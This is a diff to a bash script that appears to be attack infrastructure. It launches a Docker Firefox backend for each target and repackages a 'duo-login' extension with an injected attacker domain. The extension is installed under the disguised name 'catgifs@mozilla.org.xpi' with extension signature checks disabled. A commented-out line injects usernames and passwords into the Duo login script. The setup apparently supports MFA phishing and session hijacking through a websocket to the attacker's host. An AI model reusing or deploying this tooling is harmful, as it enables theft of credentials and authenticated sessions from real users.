@@ -1,23 +1,35 @@
-# usage: run-server BID port ATTACK_DOM
-echo "starting docker process at: $(date +%s%N | cut -b1-13)"
+# Launches a docker backend given a BID (Backend ID), a Port, and an 
+# Attacker's domain (needed so that websocket in docker container's 
+# firefox extension knows where to connect to)
+# 
+# usage: run-server BID port ATTACK_DOM localhost_ip
+
+echo "[*] Starting docker process at: $(date +%s%N | cut -b1-13)"
 prefix=$( cd "$(dirname "${BASH_SOURCE[0]}")" ; pwd -P )
 
+# Copy firefox extension .zip into tmp, and unzip it to modify it
 cp -R $prefix/../firefox/firefoxSID /docker/appdata/firefoxSID$1
 cp $prefix/../firefox/duo-login-ext/duo.zip /tmp/duo$1.zip
 unzip -o /tmp/duo$1.zip -d /tmp/duo$1
-echo -e "var USER=\"$2\";var PASS=\"$3\";var SID=\"$1\";\n$(cat /tmp/duo$1/duo-login.js)" > /tmp/duo$1/duo-login.js
+
+# Inject relavent vars
+# echo -e "var USER=\"$2\";var PASS=\"$3\";var SID=\"$1\";\n$(cat /tmp/duo$1/duo-login.js)" > /tmp/duo$1/duo-login.js
 echo -e "var BID=\"$1\";var ATTACK_DOM=\"$3\";\n$(cat /tmp/duo$1/background.js)" > /tmp/duo$1/background.js
+
+# Re-zip the extension and place it into the right extensions directory
 cd /tmp/duo$1
 zip duo$1.zip *
 mv /tmp/duo$1/duo$1.zip /docker/appdata/firefoxSID$1/profile/extensions/catgifs@mozilla.org.xpi
 rm -r /tmp/duo$1
 rm /tmp/duo$1.zip
 
-echo "running docker command at: $(date +%s%N | cut -b1-13)"
+# --add-host=docker-host:`ip addr show docker0 | grep -Po 'inet \K[\d.]+'` \
+# Start the docker container. --add-host is not nee
+# Setting firefox preferences are mostly non-important but some are
+# (don't remember which?)
 docker run -d \
     --name=firefoxSID$1 \
     -p $2:5800 \
-	--add-host=docker-host:`ip addr show docker0 | grep -Po 'inet \K[\d.]+'` \
     -v /docker/appdata/firefoxSID$1:/config:rw \
     --shm-size 2g \
 	-e "FF_PREF_INSTALL=xpinstall.signatures.required=false" \
